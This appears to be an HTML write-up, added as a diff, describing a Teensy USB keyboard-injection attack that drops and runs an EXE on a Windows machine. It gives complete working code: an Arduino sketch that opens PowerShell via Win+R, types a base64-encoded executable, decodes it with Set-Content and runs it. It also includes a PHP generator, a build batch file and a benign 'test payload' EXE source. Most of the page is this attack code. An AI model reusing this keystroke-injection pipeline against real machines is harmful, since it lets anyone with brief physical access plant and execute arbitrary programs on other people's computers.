@@ -1,0 +1,445 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<style>
+.main
+{
+  //list of interesting legal words http://kuancheen.blogspot.com/2005/07/legal-and-formal-adverbs.html
+  font-family:  times, serif;
+  font-size: 12px;
+  width:500px;
+  margin: 0 auto;
+}
+h1
+{
+  text-align: center;
+  font-size: 16px;
+}
+h2
+{
+  text-align: center;
+  font-size: 16px;
+  border-bottom: 1px solid black;
+  padding-bottom: 4px;
+}
+body ol li
+{
+  padding: 2px;
+}
+body ol li:first-child p
+{
+  margin-top: 0px;
+}
+body ol li:last-child p
+{
+  margin-bottom: 0px;
+}
+table
+{
+  border-collapse:collapse;
+}
+tr:first-child th, tr:first-child td
+{
+  border-bottom: 1px solid #000;
+  font-weight: normal;
+  padding-top: 8px;
+}
+tr:last-child td, tr:last-child th
+{
+  border-bottom: 1px solid #000;
+}
+td, th
+{
+  padding-left: 8px;
+  padding-right: 8px;
+  padding-top:3px;
+  padding-bottom:1px;
+}
+/*
+  Use the lt class for a table that needs to be compact.
+  Its not nice to look at, but saves paper.
+*/
+.lt tr td, .lt tr th
+{
+  padding-top:0px;
+  padding-bottom:0px;
+  padding-left:2px;
+  padding-right: 2px;
+}
+.mname
+{
+  
+}
+
+/*VIM syntax*/
+/*codeblock-vhdl: VHDL*/
+.codeblock-vhdl .Constant { /*color: #ff6060;*/ color: #f00; }
+.codeblock-vhdl .Special { color: #ff8500; }
+.codeblock-vhdl .Statement { /*color: #eaea00;*/ color: #04b;}
+.codeblock-vhdl .Type { color: #60d060; }
+
+/*codeblock-tcl: Tcl/TK */
+.codeblock-tcl .Constant { color: #f00; }
+.codeblock-tcl .Comment { color: #80a0ff; }
+
+/*codeblock-v: Verilog*/
+.codeblock-v .Constant { color: #f00; }
+.codeblock-v .Special { color: #ff8500; }
+.codeblock-v .PreProc { color: #ff80ff; }
+.codeblock-v .Statement { color: #04b; }
+.codeblock-v .Comment { color: #90b0ff; }
+
+/*codeblock-c: C*/
+.codeblock-c .Constant { color: #f00; }
+.codeblock-c .PreProc { color: #ff80ff; }
+.codeblock-c .Statement { color: #04b; }
+.codeblock-c .Comment { color: #90b0ff; }
+
+/*codeblock-php: PHP/HTML*/
+.codeblock-php .Title { color: #ff00ff; font-weight: bold; }
+.codeblock-php .htmlUnderline { text-decoration: underline; }
+.codeblock-php .htmlItalic { font-style: italic; }
+.codeblock-php .Constant { color: #f00; }
+.codeblock-php .Identifier { color: #40ffff; }
+.codeblock-php .PreProc { color: #ff80ff; }
+.codeblock-php .htmlBoldItalic { font-weight: bold; font-style: italic; }
+.codeblock-php .Statement { color: #04b; }
+.codeblock-php .htmlBold { font-weight: bold; }
+.codeblock-php .Special { color: #ff8500; }
+.codeblock-php .Comment { color: #90b0ff; }
+.codeblock-php .Type { color: #60d060; }
+
+.codeblock
+{
+white-space: pre-wrap; font-family: monospace; color: #000; background-color: #fff;
+font-size: 10px;
+counter-reset: lss;
+border: 1px solid #000;
+}
+.popline { counter-increment:lss; }
+/*
+this cannot be used due to too many sections.
+.codeblock .popline:before {content: counters(lss, ".", decimal-leading-zero) ""; color: #f00; font-size:10px; background-color: #fff; border-right: 1px solid #600; font-weight: bold;} 
+*/
+.linenum
+{
+  color: #f00;
+  border-right: 1px solid #600;
+}
+/*end VIM Syntax*/
+</style>
+<script>
+//Line Number Script
+//(C) 2010-2013 Rich Marino. All Rights Reserved.
+onload=function()
+{
+  //make the getElementsByClassName method
+  if (document.getElementsByClassName == undefined)
+  {
+    document.getElementsByClassName = function(className)
+    {
+      var hasClassName = new RegExp("(?:^|\\s)" + className + "(?:$|\\s)");
+      var allElements = document.getElementsByTagName("*");
+      var results = [];
+      var element;
+      for( var i = 0; (element = allElements[i]) != null; i++ )
+      {
+        var elementClass = element.className;
+        if (elementClass && elementClass.indexOf(className) != -1 && hasClassName.test(elementClass))
+        {
+          results.push(element);
+        }
+      }
+      return results;
+    }
+  }
+  
+  //now actually take care of the text
+  wrapCodeBlocks('codeblock');
+}
+
+function wrapText(element)
+{
+  var newString = '';
+  var lines = element.innerHTML.split("\n");
+  
+  var lx = ('' + lines.length ).length;
+  var mxl = 60;
+  for( var i in lines )
+  {
+    var num = '' + i;
+    while(num.length < lx)
+    {
+      num = ' ' + num;
+    }
+    newString += "<span class=linenum>";
+    newString += num + "</span><span class=popline>";
+    /*
+    //uncomment this if you want to put a mark at the character specified by mxl above.
+    if( lines[i].length > mxl )
+    {
+      newString += lines[i].substring(0,mxl) + "<span style='border-right: 1px solid #f00;'></span>";
+      newString += lines[i].substring(mxl);
+    }
+    else
+    {
+      newString += lines[i];
+    }
+    */
+    newString += lines[i];
+    newString += "</span>\n";
+  }
+  element.innerHTML = newString + '';
+}
+
+function wrapCodeBlocks(type)
+{
+  var codeblocks = document.getElementsByClassName(type);
+  for( var cb in codeblocks )
+  {
+    if( typeof( codeblocks[cb]) == 'object'  ){
+      wrapText( codeblocks[cb] );
+    }
+  }
+}
+</script>
+
+</head>
+<body>
+<div class="main">
+<!--begin content-->
+<span class="mname">Richard A. Marino</span>
+<h1>Teensy hack: Dumping an EXE file on a Windows System</h1>
+This document describes a security exploit that enables dropping an EXE (or other file) onto a Windows System, from a Teensy, using only the USB HID Keyboard. 
+<h2>Basic Procedure</h2>
+The goal is to drop a binary onto a running system using only the keyboard driver. In order to do this, the file will be Base64 encoded, then typed into the system, and decoded using PowerShell.
+<p>The preparation of the Teensy consists of base64 encoding an EXE file, then setting up the keyboard commands to open PowerShell (I used Winkey + R, then type Powershell, then type commands). Due to a bug in the Arduino software, lines above a certain length result in a stack overflow <i>in the compiler or IDE</i> during the compilation process. To mitigate this, I wrote a PHP script to split up the file. </p>
+<p>It is also worthwhile to consider the limited memory available on the Teensy. To combat this, and reduce the time needed to orchestrate the attack, I decided to UPX the EXE file.</p>
+Also, I found it is desirable to compile the payload with Tiny C Compiler, as it makes very small binaries (the test payload is 3.5 KB uncompressed).
+<h2>C Program (EXE)</h2>
+This is the EXE file I used for testing. When compiled with the Tiny C Compiler (9.25 Win32 binary, 32-bit), it comes out to 3.5KB EXE file, which UPXes down to about 3KB.
+<pre class='codeblock codeblock-c'>
+<span class="PreProc">#include </span><span class="Constant">&lt;windows.h&gt;</span>
+<span class="PreProc">#define ID_BUTTON </span><span class="Constant">10</span>
+LPCSTR AppName = <span class="Constant">&quot;TestApp&quot;</span>;
+HINSTANCE _hInst;
+
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+  HDC hdc;
+  PAINTSTRUCT ps;
+  HPEN hPen;
+  HFONT hFont;
+  <span class="Statement">switch</span>(message)
+  {
+    <span class="Statement">case</span> WM_CREATE:
+      ShowWindow(hWnd, SW_MAXIMIZE);
+      CreateWindow(<span class="Constant">&quot;Button&quot;</span>,<span class="Constant">&quot;A Button&quot;</span>,BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE ,<span class="Constant">140</span>,<span class="Constant">70</span>,<span class="Constant">100</span>,<span class="Constant">25</span>,hWnd,(HMENU)ID_BUTTON,_hInst,<span class="Constant">0</span>);
+      UpdateWindow(hWnd);
+      <span class="Statement">break</span>;
+    <span class="Statement">case</span> WM_DESTROY:
+      PostQuitMessage(<span class="Constant">0</span>);
+      <span class="Statement">break</span>;
+    <span class="Statement">case</span> WM_COMMAND:
+      <span class="Statement">switch</span>(wParam)
+        <span class="Statement">case</span> ID_BUTTON:
+          MessageBoxA(<span class="Constant">0</span>, <span class="Constant">&quot;HAHA&quot;</span>, <span class="Constant">&quot;!&quot;</span>, <span class="Constant">0</span>);
+      <span class="Statement">break</span>;
+    <span class="Statement">case</span> WM_PAINT:
+      hdc = BeginPaint(hWnd, &amp;ps);
+      hPen = CreatePen(PS_DASHDOT, <span class="Constant">1</span>, RGB(<span class="Constant">255</span>, <span class="Constant">0</span>, <span class="Constant">0</span>));
+      hFont = CreateFont(<span class="Constant">40</span>, <span class="Constant">10</span>, <span class="Constant">0</span>, <span class="Constant">0</span>,
+                           FW_NORMAL, FALSE, FALSE, FALSE,
+                           ANSI_CHARSET, OUT_DEFAULT_PRECIS,
+                         CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+                         DEFAULT_PITCH | FF_ROMAN,
+                        <span class="Constant">&quot;Times New Roman&quot;</span>);
+      SelectObject(hdc, hPen);
+      Rectangle(hdc, <span class="Constant">20</span>, <span class="Constant">22</span>, <span class="Constant">250</span>, <span class="Constant">125</span>);
+      SelectObject(hdc, hFont);
+      TextOut(hdc, <span class="Constant">26</span>, <span class="Constant">25</span>, <span class="Constant">&quot;This is a test payload.&quot;</span>, <span class="Constant">23</span>);
+      EndPaint(hWnd, &amp;ps);
+      <span class="Statement">break</span>;
+    <span class="Statement">default</span>:
+      <span class="Statement">return</span> DefWindowProc(hWnd, message, wParam, lParam);
+  }
+  <span class="Statement">return</span> <span class="Constant">0</span>;
+}
+<span class="Type">int</span> WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, <span class="Type">int</span> nCmdShow)
+{
+  MSG msg1;
+  WNDCLASS wc1;
+  HWND hWnd1;
+  _hInst = hInst;
+  ZeroMemory(&amp;wc1, <span class="Statement">sizeof</span> wc1);
+  wc1.hInstance = hInst;
+  wc1.lpszClassName = AppName;
+  wc1.lpfnWndProc = (WNDPROC)WndProc;
+  wc1.style = CS_DBLCLKS | CS_VREDRAW | CS_HREDRAW;
+  wc1.hbrBackground = GetSysColorBrush(COLOR_WINDOW);
+  wc1.hIcon = LoadIcon(<span class="Constant">NULL</span>, IDI_INFORMATION);
+  wc1.hCursor = LoadCursor(<span class="Constant">NULL</span>, IDC_ARROW);
+  <span class="Statement">if</span>(RegisterClass(&amp;wc1) == FALSE) <span class="Statement">return</span> <span class="Constant">0</span>;
+  hWnd1 = CreateWindow(AppName, AppName, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="Constant">10</span>, <span class="Constant">10</span>, <span class="Constant">360</span>, <span class="Constant">240</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, hInst, <span class="Constant">0</span>);
+  <span class="Statement">if</span>(hWnd1 == <span class="Constant">NULL</span>) <span class="Statement">return</span> <span class="Constant">0</span>;
+  <span class="Statement">while</span>(GetMessage(&amp;msg1,<span class="Constant">NULL</span>,<span class="Constant">0</span>,<span class="Constant">0</span>) &gt; <span class="Constant">0</span>){
+    TranslateMessage(&amp;msg1);
+    DispatchMessage(&amp;msg1);
+  }
+  <span class="Statement">return</span> msg1.wParam;
+}
+</pre>
+
+<h2>Arduino Program (Template)</h2>
+<pre class='codeblock codeblock-c'>
+<span class="Comment">/*</span>
+<span class="Comment">  Based on the Simple USB Keyboard Example.</span>
+<span class="Comment">  On the Teensy 3.0, the LED is on Pin 13.</span>
+<span class="Comment">*/</span>
+
+<span class="Type">const</span> <span class="Type">int</span> ledPin = <span class="Constant">13</span>;
+<span class="Type">int</span> count = <span class="Constant">0</span>;
+
+<span class="Type">void</span> setup() {
+  pinMode(ledPin, OUTPUT);
+  Serial.begin(<span class="Constant">9600</span>);
+  delay(<span class="Constant">1000</span>);
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(<span class="Constant">20</span>);
+  Keyboard.press(<span class="Constant">'r'</span>);
+  delay(<span class="Constant">20</span>);
+  Keyboard.release(<span class="Constant">'r'</span>);
+  delay(<span class="Constant">20</span>);
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(<span class="Constant">2000</span>);
+  Keyboard.print(<span class="Constant">&quot;powershell&quot;</span>);
+  delay(<span class="Constant">10</span>);
+  Keyboard.println();
+  delay(<span class="Constant">3000</span>);
+  <span class="Comment">/*</span><span class="Comment">put the generated code here.</span><span class="Comment">*/</span>
+
+  <span class="Comment">/*</span><span class="Comment">end of the generated code here.</span><span class="Comment">*/</span>
+  delay(<span class="Constant">1000</span>);
+  digitalWrite(ledPin, HIGH);   <span class="Comment">// set the LED on</span>
+  <span class="Statement">while</span>(<span class="Constant">1</span>)
+  {
+
+  }
+}
+
+<span class="Type">void</span> loop() {
+  delay(<span class="Constant">50000</span>);
+}
+</pre>
+
+
+<h2>PHP Script (writes the missing part of the Arduino Program)</h2>
+<pre class='codeblock codeblock-php'>
+<span class="Special">&lt;?</span>
+<span class="Statement">$</span><span class="Identifier">precode</span> <span class="Statement">=</span> &quot;<span class="Constant">Keyboard.print(</span><span class="Special">\&quot;</span><span class="Special">\$</span><span class="Constant">cc = [System.Convert]::FromBase64String('</span><span class="Special">\&quot;</span><span class="Constant">);</span><span class="Special">\n</span><span class="Constant">delay(10);</span><span class="Special">\n</span>&quot;;
+<span class="Statement">$</span><span class="Identifier">out</span> <span class="Statement">=</span> <span class="Identifier">base64_encode</span><span class="Special">(</span><span class="Identifier">file_get_contents</span><span class="Special">(</span>'<span class="Constant">packed.exe</span>'<span class="Special">))</span>;
+<span class="Statement">$</span><span class="Identifier">postcode</span> <span class="Statement">=</span> &quot;<span class="Constant">Keyboard.print(</span><span class="Special">\&quot;</span><span class="Constant">');</span><span class="Special">\&quot;</span><span class="Constant">);</span><span class="Special">\n</span><span class="Constant">delay(10);</span><span class="Special">\n</span><span class="Constant">Keyboard.println();</span><span class="Special">\n</span><span class="Constant">delay(1000);</span><span class="Special">\n</span><span class="Constant">Keyboard.print(</span><span class="Special">\&quot;</span><span class="Constant">Set-Content -Path out.exe -Value </span><span class="Special">\$</span><span class="Constant">cc -Encoding Byte</span><span class="Special">\&quot;</span><span class="Constant">);</span><span class="Special">\n</span><span class="Constant">delay(10);</span><span class="Special">\n</span><span class="Constant">Keyboard.println();</span><span class="Special">\n</span><span class="Constant">delay(1000);</span><span class="Special">\n</span><span class="Constant">Keyboard.print(</span><span class="Special">\&quot;</span><span class="Constant">./out.exe</span><span class="Special">\&quot;</span><span class="Constant">);</span><span class="Special">\n</span><span class="Constant">delay(10);</span><span class="Special">\n</span><span class="Constant">Keyboard.println();</span><span class="Special">\n</span>&quot;;
+<span class="Statement">$</span><span class="Identifier">vx</span> <span class="Statement">=</span> <span class="Identifier">str_split</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">out</span>,<span class="Constant">400</span><span class="Special">)</span>;
+<span class="PreProc">echo</span> <span class="Statement">$</span><span class="Identifier">precode</span>;
+<span class="Statement">foreach</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">vx</span> <span class="Statement">as</span> <span class="Statement">$</span><span class="Identifier">v</span><span class="Special">)</span>
+<span class="Special">{</span>
+  <span class="PreProc">echo</span> '<span class="Constant">Keyboard.print(&quot;</span>'<span class="Statement">.</span> <span class="Statement">$</span><span class="Identifier">v</span> <span class="Statement">.</span> '<span class="Constant">&quot;);</span>' <span class="Statement">.</span> &quot;<span class="Special">\n</span><span class="Constant">delay(10);</span><span class="Special">\n</span>&quot;;
+<span class="Special">}</span>
+<span class="PreProc">echo</span> <span class="Statement">$</span><span class="Identifier">postcode</span>;
+<span class="Special">?&gt;</span>
+</pre>
+
+<h2>Batch File</h2>
+I wrote a batch file to automate the compile.
+<pre class="codeblock">
+tcc.exe w.c
+copy w.exe packed.exe
+upx --best --ultra-brute packed.exe
+php make5bytes.php > t.txt
+</pre>
+
+<h2>Complete Arduino Program</h2>
+<pre class='codeblock codeblock-c'>
+<span class="Comment">/*</span>
+<span class="Comment">  Based on the Simple USB Keyboard Example.</span>
+<span class="Comment">  On the Teensy 3.0, the LED is on Pin 13.</span>
+<span class="Comment">*/</span>
+
+<span class="Type">const</span> <span class="Type">int</span> ledPin = <span class="Constant">13</span>;
+<span class="Type">int</span> count = <span class="Constant">0</span>;
+
+<span class="Type">void</span> setup() {
+  pinMode(ledPin, OUTPUT);
+  Serial.begin(<span class="Constant">9600</span>);
+  delay(<span class="Constant">1000</span>);
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(<span class="Constant">20</span>);
+  Keyboard.press(<span class="Constant">'r'</span>);
+  delay(<span class="Constant">20</span>);
+  Keyboard.release(<span class="Constant">'r'</span>);
+  delay(<span class="Constant">20</span>);
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(<span class="Constant">2000</span>);
+  Keyboard.print(<span class="Constant">&quot;powershell&quot;</span>);
+  delay(<span class="Constant">10</span>);
+  Keyboard.println();
+  delay(<span class="Constant">3000</span>);
+  <span class="Comment">/*</span><span class="Comment">put the generated code here.</span><span class="Comment">*/</span>
+Keyboard.print(<span class="Constant">&quot;$cc = [System.Convert]::FromBase64String('&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwMLAQYAABAAAAAQAAAAMAAA4EQAAABAAAAAUAAAAABAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAABgAAAAEAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAABQAAA4AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAAADAAAAAQAAAAAAAAAAIAAAAAAAAAAAAAAAAAAIAAAOBVUFgxAAAAAAAQAAAAQAAAAAgAAAACAAAAAAAAAAAAAAAAAABAAADgVVBYMgAAAAAAEAAAAFAAAAACAAAACgAAAAAAAAAAAAAAAAAAQAAAwDMuMDkAVVBYIQ0JAgrSgY+PnwLxRvciAAC9BAAAAA4AAAAAAHG73V/+VYnlgexMAJCLRQzpBQjpCQSD+O6XbvcBD4VuCLgDG1AIUOg5BQ4W7PaRAAWgI0AGuAobCRkZ2cwZBWRGjF7s&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;+RctULgTIAwFQOxurNxL9QRU9AjpgwF2fGdnmQIVJt4dZWY2d/MMgfgRCiA9rRuyHcgQCjYdb/kGZGQhHJ1mHDu72S4PL/SNRbzbhR+RzsW+iUX8uP8/JzkD2GzssXMZuLgjTRDVBcaO7BSQAREKWyil20ZGH7SBuIX8I2Mj3RcEwn36BRYUJ5sbOyD+ky206cbGRpoDFzOcGS0a1w3YSdgD4dMM6RvnrGs6PxQQAwwZwYz2G3uWoekEycLoGTaL8GRICInxtsj43WxuWDqOg8QMIEXM/m2b2xUAhgjgIBAHwLgLALM/x/7fvLgF7WkD2LgEf0QyII98E13QuABRMsMzNtRgTfjzny6EN+ymCb1b8H1vyRFnaAEFHc9wslnM754Ga20Cwhky84G4&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;ZUDPcHLZUpPkwQKO2wx27JcRtwIItuvITWOfC2HsRUy4AnGbpBvpfj3EBFUDAROP4RsebwgHhbyFwA+Ev6zPtu8e/LkgBw++EDnRnw0SicHJJd/ug8ABKOvgHyI+g2xvsx0TCIXJRiUi/l3IJRDpmevH6S7JlE32FjcgfoRmYZQd0p4vuOu+m6QBz74Ki03kg+EetGS/54zHGXsKBEu3RfiPWYzovzPu6HD9//+REY5cOogBycNUCJfju3sjauhUAQf4Errb9m3sjhiJDIcEiwhRCPg8U9ndcyMIKzOF/DnIsbZZw+O4YLYGKb4a+HbDIWyGG0v/EIP5Iix03yzZCRFF0ey7uSi3b/dRUVG5FFGvwPz53GfPAsMAAP8l1GUH2GSQQQbc4OQgJwcZ&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;6BQhGIMMMsgcICTseXKQkyDwLCH0IMlBBjn4/AAhgwwyyAQIDDAMMsggNERIM8ggg0w4PLqiKDAABMH+/zsVVGVzdEFwcABCdXR0b24AQSAI326N2khBAS0eaW0gIE5ld91de/sgUm9tYRZUaGkOAmEgdDggFAVG/3BheWxvYWQuA6gqBFb8+Fu1OZhEEYZHZXRDb23/j/0l32RMaW5lQRBTdGFydHVwSW5mb7bN/SdNb2R1bGVIJAVBPKU/7P9pFENyZWF0ZVBlbgpGb250mbvfdjJTZSdjdE9iagUAAVJ0t7eyOmcKVGV4FnV0Q6+/2/3TLG1lbXNlJV9fBl9hcHBfdG3tu915cCpfY0tyb2xmcAs1aWazudYhcw4COrrUELNhbftTaG93V7Vk&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;BX8N2y3Z3UV4g1VwZBANUG86UXcw97d1RU1lc3NhZ14IQm8rYK0r/0JlZ2luUGFlRTAJD8J29kRlZj5QhmMZeXNDLcT2b5JvckJydXNoEUwASelae9anQQpDdaAbT1Jgs/abb2VyQ2xhZTlvk7kLuwxUcgxzbJuLREgku20scA9jaCOl+Sfk5VBFTAEC4AAPAwsBBvY03QlgEw0QIEALtmGTbjYEBxcwgXXJTgAGKBAHZHlZvAYjcCBkgaQbINRXgNn3OscudCQHSOaQCLeuoTls9iAu32ELubAv2KQD++gKJ0AAMNtvwBvUIQOjAAAAAAAAACT/AAAAAAAAAAAAAAAAAABgvhVAQACNvuvP//9Xg83/6xCQkJCQkJCKBkaIB0cB23UHix6D7vwR&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;23LtuAEAAAAB23UHix6D7vwR2xHAAdtz73UJix6D7vwR23PkMcmD6ANyDcHgCIoGRoPw/3R0icUB23UHix6D7vwR2xHJAdt1B4seg+78EdsRyXUgQQHbdQeLHoPu/BHbEckB23PvdQmLHoPu/BHbc+SDwQKB/QDz//+D0QGNFC+D/fx2D4oCQogHR0l19+lj////kIsCg8IEiQeDxwSD6QR38QHP6Uz///9ejb4AIAAAiwcJwHQ8i18EjYQwAEAAAAHzUIPHCP+WZEAAAJWKB0cIwHTciflXSPKuVf+WaEAAAAnAdAeJA4PDBOvh/5Z4QAAAi65sQAAAjb4A8P//uwAQAABQVGoEU1f/1Y2HnwEAAIAgf4BgKH9YUFRQU1f/1VhhjUQkgGoAOcR1&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;+oPsgOkjzf//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJhQAABkUAAAAAAAAAAAAAAAAAAApVAAAIBQAAAAAAAAAAAAAAAAAACvUAAAiFAAAAAAAAAAAAAAAAAAALpQAACQUAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEUAAA0lAAAOJQAADyUAAAAFEAAA5RAAAAAAAAHFEAAAAAAAAmUQAA&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;AAAAACxRAAAAAAAAS0VSTkVMMzIuRExMAGdkaTMyLmRsbABtc3ZjcnQuZGxsAHVzZXIzMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MAAFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MAAABUZXh0T3V0QQAAZXhpdAAARW5kUGFpbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.print(<span class="Constant">&quot;');&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.println();
+delay(<span class="Constant">1000</span>);
+Keyboard.print(<span class="Constant">&quot;Set-Content -Path out.exe -Value $cc -Encoding Byte&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.println();
+delay(<span class="Constant">1000</span>);
+Keyboard.print(<span class="Constant">&quot;./out.exe&quot;</span>);
+delay(<span class="Constant">10</span>);
+Keyboard.println();
+
+  <span class="Comment">/*</span><span class="Comment">end of the generated code here.</span><span class="Comment">*/</span>
+  delay(<span class="Constant">1000</span>);
+  digitalWrite(ledPin, HIGH);   <span class="Comment">// set the LED on</span>
+  <span class="Statement">while</span>(<span class="Constant">1</span>)
+  {
+
+  }
+}
+
+<span class="Type">void</span> loop() {
+  delay(<span class="Constant">50000</span>);
+}
+</pre>
+
+<h2>References</h2>
+Arduino Hacking For The Big Boys. TrustedSec. <a href=https://www.trustedsec.com/august-2011/arduino-hacking-for-the-big-boys/>https://www.trustedsec.com/august-2011/arduino-hacking-for-the-big-boys/</a> Published 3 August 2011. Accessed 11 October 2013.
+<!--end content-->
+</div>
+</body>
+</html>
+
+
